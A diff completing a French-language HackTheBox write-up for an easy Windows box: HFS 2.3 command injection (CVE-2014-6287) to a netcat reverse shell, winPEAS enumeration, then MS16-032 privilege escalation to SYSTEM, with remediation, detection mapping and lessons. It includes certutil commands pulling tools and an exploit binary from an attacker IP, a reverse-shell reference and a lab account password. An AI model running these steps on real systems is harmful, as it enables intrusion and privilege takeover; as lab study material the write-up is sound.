@@ -5,9 +5,9 @@
 | **Plateforme** | HackTheBox |
 | **OS** | Windows |
 | **Difficulté** | 🟢 Easy |
-| **Date** | 2026-__-__ |
-| **Vecteur** | <foothold : à compléter> → <privesc : à compléter> |
-| **CVE** | CVE-2024-23692 (Template Injection / RCE) |
+| **Date** | 2026-09-28 |
+| **Vecteur** | HFS 2.3 RCE (CVE-2014-6287, EDB 39161) → shell `kostas` → privesc noyau MS16-032 (EDB 41020) → SYSTEM |
+| **CVE** | CVE-2014-6287 (foothold, HFS 2.3) · MS16-032 / CVE-2016-0099 (privesc, Secondary Logon) |
 | **Tags** | windows · web · privesc-noyau |
 
 > Remplacer `<IP_CIBLE>` par l'IP de ta session. tun0 = `10.10.14.x` · cible = `10.129.x.x`.
@@ -19,7 +19,13 @@
 
 ## TL;DR
 
-<À remplir en fin de box.>
+Le seul port ouvert (80) sert **HttpFileServer (HFS) 2.3**, vulnérable à une injection de
+commande (CVE-2014-6287, contournement de filtre par `%00`). L'exploit Python fait télécharger
+`nc.exe` depuis ma Kali et lance un reverse shell → utilisateur `kostas`. L'énumération montre
+un **Server 2012 R2 très peu patché** (31 hotfixes, dernier de 2014), **sans `SeImpersonate`** et
+sans service/tâche modifiable → seule voie : **exploit noyau MS16-032** (Secondary Logon, EDB 41020) → SYSTEM.
+
+**Recon (HFS 2.3) → foothold RCE CVE-2014-6287 → shell `kostas` → privesc noyau MS16-032 → SYSTEM.**
 
 ---
 
@@ -56,8 +62,8 @@ Nmap done: 1 IP address (1 host up) scanned in 212.45 seconds
 **Méthode :** version du service → recherche d'exploit public (`searchsploit` / web) → lire, adapter, lancer.
 
 - Service & version ciblés : `httpd 2.3`
-- Exploit retenu (source, EDB-ID / CVE) : `CVE-2024-23692`
-- Adaptations faites (LHOST/LPORT, payload…) : `______`
+- Exploit retenu (source, EDB-ID / CVE) : `CVE-2014-6287`
+- Adaptations faites : dans `39161.py`, régler `ip_addr` = mon IP tun0 et `local_port` = port de mon listener `nc` (⚠️ les deux doivent correspondre). Servir `nc.exe` via `python3 -m http.server 80`.
 
 ```bash
 
@@ -164,20 +170,67 @@ Hotfix(s):                 31 Hotfix(s) Installed.
 
 Outils au choix : winPEAS, Seatbelt, ou un script d'énumération de correctifs manquants.
 
-- Piste retenue : `______`
+```powershell
 
+certutil -urlcache -split -f http://10.10.14.236/winPEASx64.exe wp.exe
+
+DefaultUserName               :  kostas
+DefaultPassword               :  kdeEjDowkS*
+Matched 169 known exploited vulnerabilities for this running Windows version.
+Matched products: Windows Server 2012 R2 | Windows Server 2012 R2 (Server Core installation)
+CVE-2014-4113 KB3000061 [Critical] Remote Code Execution
+CVE-2014-6321 KB2992611 [Critical] Remote Code Execution
+CVE-2014-6332 KB3010788 [Critical] Remote Code Execution
+CVE-2015-0010 KB3013455 [Critical] Remote Code Execution
+CVE-2015-1635 KB3042553 [Critical] Remote Code Execution
+CVE-2015-2426 KB3079904 [Critical] Remote Code Execution
+CVE-2015-2433 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2455 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2456 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2458 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2459 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2460 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2462 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2463 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2464 KB3078601 [Critical] Remote Code Execution
+CVE-2015-2502 KB3087985 [Critical] Remote Code Execution
+CVE-2015-2507 KB3087039 [Critical] Remote Code Execution
+CVE-2015-2512 KB3087039 [Critical] Remote Code Execution
+CVE-2015-2527 KB3087039 [Critical] Remote Code Execution
+CVE-2015-6100 KB3097877 [Critical] Remote Code Execution
+
+```
+
+
+
+- Lecture par élimination : **pas de `SeImpersonate`** (jeton fermé), **aucun service/tâche modifiable**, **AlwaysInstallElevated indisponible** → toutes les voies « config » fermées. Il reste : **OS 2012 R2 très peu patché** (31 hotfixes, dernier 2014) → **exploit noyau**.
+- Piste retenue : **MS16-032** (Secondary Logon Handle). Note : l'AutoLogon `kostas / kdeEjDowkS*` trouvé par winPEAS est **mon propre compte** → pas une élévation.
+- Binaire compilé récupéré ici : https://gitlab.com/exploit-database/exploitdb-bin-sploits (EDB **41020**).
 ---
 
 ## 4. Élévation de privilèges
 
 **Méthode :** identifier ce qui manque côté correctifs / configuration → choisir la technique adaptée → l'exécuter proprement.
 
+Piste : **MS16-032** (CVE-2016-0099). J'ai téléchargé le binaire compilé **EDB 41020** (repo bin-sploits)
+sur ma Kali, servi via HTTP, tiré sur la cible, puis lancé depuis le shell `kostas` :
+
 ```powershell
-# à compléter
+:: sur la cible (dossier accessible en écriture)
+cd C:\Users\kostas\Desktop
+certutil -urlcache -split -f http://10.10.14.236/41020.exe ms16032.exe
+ms16032.exe
+:: → une nouvelle fenêtre / process s'exécute en SYSTEM
+whoami
+nt authority\system
 ```
 
 - **Résultat :** `nt authority\system`
-- Pourquoi cette technique fonctionne (pour l'oral) : `______`
+- Pourquoi cette technique fonctionne (pour l'oral) : le service **Secondary Logon** (`seclogon`)
+  gère mal les **handles de threads** ; MS16-032 crée un thread avec un handle non correctement
+  vérifié et l'utilise pour usurper le jeton d'un processus SYSTEM → élévation. C'est une **faille
+  noyau/service**, corrigée par le patch KB3139914 — d'où l'importance de l'état des correctifs.
+- Alternative plus propre (sans binaire tiers) : la version PowerShell `Invoke-MS16-032.ps1`, exécutable en mémoire (`IEX`).
 
 **Flag root :** desktop Administrateur (non publié).
 
@@ -185,9 +238,9 @@ Outils au choix : winPEAS, Seatbelt, ou un script d'énumération de correctifs 
 
 ## 5. Remédiation
 
-- <correctif foothold>
-- <correctif privesc>
-- <durcissement transverse>
+- **Foothold** : mettre HFS à jour (CVE-2014-6287 corrigée après 2.3c) ou le retirer ; ne pas exposer un service obsolète en frontal.
+- **Privesc** : appliquer les correctifs Windows, en particulier **KB3139914** (MS16-032) ; gérer un cycle de patch régulier (ici, dernier patch en 2014).
+- **Transverse** : moindre privilège du service web (il ne devrait pas permettre l'exécution de commandes), EDR pour détecter le dépôt/exécution de `nc.exe` et des exploits, filtrage sortant pour couper le pull de payload.
 
 ---
 
@@ -195,15 +248,19 @@ Outils au choix : winPEAS, Seatbelt, ou un script d'énumération de correctifs 
 
 | Étape | Trace / Event | Détection |
 | --- | --- | --- |
-| foothold | | |
-| privesc | | |
+| foothold HFS RCE | requêtes `?search=%00{.exec\|...}` dans les logs HFS ; process fils anormal de `hfs.exe` (cmd/cscript) | alerte sur process enfant inattendu d'un service web (T1190, T1059) |
+| download nc.exe | `certutil -urlcache` / requête HTTP sortante vers IP externe | détection living-off-the-land `certutil` + URL (T1105) |
+| reverse shell | `nc.exe -e cmd.exe` → connexion sortante | EDR : nc + connexion sortante (T1059) |
+| privesc MS16-032 | exploitation `seclogon`, création de thread/handle anormale, nouveau process SYSTEM issu d'un compte user | Sysmon 1 (process en SYSTEM avec parent user), EDR noyau (T1068, T1134) |
 
 ---
 
 ## 7. Leçons
 
-- <ce que cette box apprend de neuf vs Shocker>
-- <piège / temps passé>
+- 1re privesc **Windows** : même logique que Shocker (foothold ≠ SYSTEM), mais côté Windows la voie était le **noyau** faute de jeton/service exploitable.
+- **Méthode d'élimination** (fiche `lire-peas`) : écarter jeton → services → tâches → creds → conclure « noyau ». C'est la formulation attendue à l'oral.
+- **bin-sploits** : beaucoup d'exploits Windows sont publiés en source ; le repo `exploitdb-bin-sploits` fournit les binaires compilés. Réflexe certif/réel : **compiler soi-même** ou préférer une version vérifiée (ici `Invoke-MS16-032.ps1`) plutôt qu'un `.exe` d'inconnu.
+- Piège Python : `39161.py` est en **Python 2** (`urllib2`) → le lancer avec `python2`, et régler `ip_addr`/`local_port` avant.
 
 ---
 
